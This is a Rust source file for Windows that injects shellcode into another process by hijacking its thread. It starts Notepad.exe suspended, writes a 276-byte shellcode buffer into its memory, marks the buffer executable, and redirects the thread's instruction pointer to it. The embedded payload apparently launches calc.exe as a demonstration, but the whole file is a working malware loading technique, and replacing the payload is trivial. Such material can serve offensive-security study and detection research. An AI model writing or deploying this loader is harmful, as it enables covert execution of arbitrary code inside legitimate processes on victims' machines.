use std::{ffi::CString, mem::zeroed};

use winapi::{
    ctypes::c_void, shared::{minwindef::FALSE, ntdef::HANDLE}, um::{
        errhandlingapi::GetLastError,
        memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory},
        processthreadsapi::{
            CreateProcessA, GetThreadContext, PROCESS_INFORMATION, ResumeThread, STARTUPINFOA,
            SetThreadContext,
        },
        synchapi::WaitForSingleObject,
        winbase::{CREATE_SUSPENDED, INFINITE},
        winnt::{CONTEXT, CONTEXT_CONTROL, PAGE_EXECUTE_READ, PAGE_READWRITE},
    },
};

fn create_suspend_process(
    process_name: &str,
    process_id: &mut u32,
    process_handle: &mut HANDLE,
    thread_handle: &mut HANDLE,
) -> bool {
    unsafe {
        let mut si = zeroed::<STARTUPINFOA>();
        let mut pi = zeroed::<PROCESS_INFORMATION>();

        si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;

        // let path = CString::new(process_name).unwrap();

        let path = CString::new(format!("C:\\Windows\\System32\\{}", process_name)).unwrap();

        // println!("Path: {}", path.to_str().unwrap());

        let status = CreateProcessA(
            std::ptr::null_mut(),
            path.as_ptr() as *mut i8,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            FALSE,
            CREATE_SUSPENDED,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut si,
            &mut pi,
        );

        if status == 0 {
            println!("[-] CreateProcessA failed with error: {}", GetLastError());
            return false;
        }

        println!(
            "[+] Process {} created with PID: {}",
            process_name, pi.dwProcessId
        );

        *process_id = pi.dwProcessId;
        *process_handle = pi.hProcess;
        *thread_handle = pi.hThread;

        if *process_id != 0
            && *process_handle as usize != 0
            && *thread_handle as usize != 0
        {
            return true;
        }
    }
    false
}

fn inject_shellcode(
    process_handle: HANDLE,
    shellcode: &[u8],
    shellcode_size: usize,
    paddress: &mut *mut c_void,
) -> bool {
    unsafe {
        *paddress = VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            shellcode_size,
            0x1000,
            PAGE_READWRITE,
        );

        if (*paddress).is_null() {
            println!("[-] VirtualAllocEx failed with error: {}", GetLastError());
            return false;
        }

        println!("[+] Allocated memory at address: {:p}", *paddress);

        let mut bytes_written: usize = 0;

        let status = WriteProcessMemory(
            process_handle,
            *paddress,
            shellcode.as_ptr() as *const c_void,
            shellcode_size,
            &mut bytes_written,
        );

        if status == 0 {
            println!(
                "[-] WriteProcessMemory failed with error: {}",
                GetLastError()
            );
            return false;
        }

        let mut old_protect: u32 = 0;

        let status = VirtualProtectEx(
            process_handle,
            *paddress,
            shellcode_size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        );

        if status == 0 {
            println!("[-] VirtualProtectEx failed with error: {}", GetLastError());
            return false;
        }
    }

    return true;
}

fn hijack_thread(thread_handle: HANDLE, paddress: *mut c_void) -> bool {
    unsafe {
        let mut thread_context: CONTEXT = std::mem::zeroed();

        thread_context.ContextFlags = CONTEXT_CONTROL;

        println!("[+] Thread handle: {:p}", thread_handle);

        let status = GetThreadContext(thread_handle, &mut thread_context);

        if status == 0 {
            println!("[-] GetThreadContext failed with error: {}", GetLastError());
            return false;
        }

        thread_context.Rip = paddress as u64;

        let status = SetThreadContext(thread_handle, &mut thread_context);

        if status == 0 {
            println!("[-] SetThreadContext failed with error: {}", GetLastError());
            return false;
        }

        ResumeThread(thread_handle);

        WaitForSingleObject(thread_handle, INFINITE);
    }

    return true;
}

fn main() {
    let buf: [u8; 276] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
        0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];
    let process_name = "Notepad.exe";
    let mut process_id: u32 = 0;
    let mut process_handle: HANDLE = std::ptr::null_mut();
    let mut thread_handle: HANDLE = std::ptr::null_mut();

    let status = create_suspend_process(
        process_name,
        &mut process_id,
        &mut process_handle,
        &mut thread_handle,
    );
    if !status {
        println!("[-] Failed to create suspended process.");
    }

    let mut paddress = std::ptr::null_mut();

    let status = inject_shellcode(process_handle, &buf, buf.len(), &mut paddress);

    if !status {
        println!("[-] Failed to inject shellcode.");
    }

    let status = hijack_thread(thread_handle, paddress);
    if !status {
        println!("[-] Failed to hijack thread.");
    }
}
